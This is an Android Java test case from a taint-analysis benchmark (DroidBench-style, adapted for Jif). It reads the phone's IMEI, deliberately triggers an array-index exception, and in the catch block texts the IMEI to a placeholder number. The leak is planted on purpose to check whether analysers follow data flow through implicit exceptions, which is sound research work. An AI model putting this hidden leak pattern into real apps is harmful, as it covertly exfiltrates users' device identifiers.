package de.ecspride;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

/**
 * @testcase_name Exceptions1
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security and Privacy by Design (EC SPRIDE) 
 * @author_mail steven.arzt@cased.de
 * 
 * @description tainted data is created and sent out in an implicitly invoked exception handler
 * @dataflow source -> imei -> exception handler -> sink
 * @number_of_leaks 1
 * @challenges the analysis must handle implicit exceptions
	* ADAPTACIONES:
	* - 34 cambio int[(int) Math.sqrt(49)] por int[7], Jif no reconoce Math.sqrt
	* - 39 y 41, try-catch NullPointerException; 
 */
public class Exceptions2 extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_exceptions2);

		String imei = "";		
		try {
			TelephonyManager telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
			imei = telephonyManager.getDeviceId(); //source
			int[] arr = new int[7];
			if (arr[32] > 0)
				imei = "";
		}
		catch (RuntimeException ex) {
			try{SmsManager sm = SmsManager.getDefault();
			sm.sendTextMessage("+49 1234", null, imei, null, null); //sink, leak
			}catch(NullPointerException e){
			}
			}
	}
}


